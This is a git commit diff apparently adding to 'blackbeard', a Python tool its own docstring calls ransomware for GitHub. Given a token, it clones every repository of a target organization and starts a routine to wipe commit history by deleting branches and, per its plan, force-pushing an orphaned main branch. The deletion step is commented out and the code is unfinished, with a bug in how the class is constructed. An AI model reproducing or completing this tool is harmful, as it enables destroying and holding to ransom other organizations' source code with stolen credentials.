c43bbf48fdcabb107aaead73641a2cb02d2e7b2c
MarkM <mark.mclarnon@gmail.com>
2023-03-01 20:44:16 -0500

    working towards a functional blackbeard

--- blackbeard.py
+++ blackbeard.py
@@ -18,21 +18,77 @@ NAME = 'BLACKBEARD'
 logger = logging.getLogger( '{}'.format(NAME) )
 
 from github import Github
+import pygit2
 
-def ransom(token, organization, readme):
-    g = Github(token)
-    repos = g.get_organization(organization).get_repos()
-    for repo in repos:
-        print(repo.name)
+class Volksfrei:
+    """
+    Self-Contained class for the ransomware actions for GitHub. 
+    """
+    def __init__( self, token,username=None ):
+        self.g = Github(token)
+        self.username = username
+        self.credentials = pygit2.UserPass(self.username, token)
+
+    def ransom(self, organization: str, delete_history=False):
+        # get an object of all repos
+        repos = self.g.get_organization(organization).get_repos()
+
+        # loop
+        for repo in repos:
+            logger.info("cloning repo {}".format(repo.name))
+            try:
+                if os.path.exists("./{}".format(repo.name)):
+                    logger.info("Skipping already seen repo {}.  Use -f to force rerun on all repos/branches".format(repo.name))
+                else:
+                    cloned_repo: pygit2.Repository = pygit2.clone_repository(repo.clone_url, "./{}".format(repo.name),
+                                        callbacks=pygit2.RemoteCallbacks(credentials=self.credentials))
+
+                if delete_history:
+                    self.delete_commit_history(cloned_repo)
+
+            except pygit2.GitError as e:
+                logger.error(e)
+                return False
+        
+        return True
+
+    def delete_commit_history(self, repo: pygit2.Repository) -> bool:
+        """
+        Pattern:
+        - delete non-Main branches
+        - checkout new branch `git checkout --orphan orphan_branch
+        - add files
+        - commit
+        - delete Main
+        - rename orphan_branch working branch to main
+        - force push
+        """
+        if not repo.is_empty:
+            branches = repo.branches.remote
+            for branch in branches:
+                if branch == "origin/main" \
+                        or branch == "origin/master" \
+                        or branch == "origin/development"\
+                        or branch == "origin/HEAD":
+                    logger.info("Skipping branch {}".format(branch))
+                    continue
+                else:
+                    logger.info("Deleting branch {}".format(branch))
+                    #repo.branches.delete(branch)
+
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
 
     parser.add_argument('action', metavar='ACTION', type=str, help='Specify action for {}'.format(NAME) )
 
+    parser.add_argument('-d', '--delete', help="Delete history", action='store_true')    
+
     parser.add_argument('-L', '--loglevel', help="Specify alternate logging level. (Default is NONE)")
     
     parser.add_argument('-t', '--token', help="Github token to use.", required=True)
+
+    parser.add_argument('-U', '--username', help="Github username to use.", required=True)
 
     parser.add_argument('-o', '--organization', help="Github organization to attack", required=True)
 
@@ -45,6 +101,9 @@ def parse_arguments():
 if __name__ == "__main__":
     arguments = parse_arguments( )
 
+    if not arguments.username:
+        arguments.username = None
+
     logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=arguments.loglevel)
     logger = logging.getLogger( NAME )
 
@@ -53,4 +112,11 @@ if __name__ == "__main__":
 
     logger.info( '{} startup'.format(NAME) )
 
-
+    if arguments.action.lower() == "ransom":
+        v = Volksfrei( arguments.token )
+        if arguments.delete:
+            delete = True
+        else:
+            delete = False
+        v.ransom( arguments.organization, delete_history=delete )
+        logger.info("done")
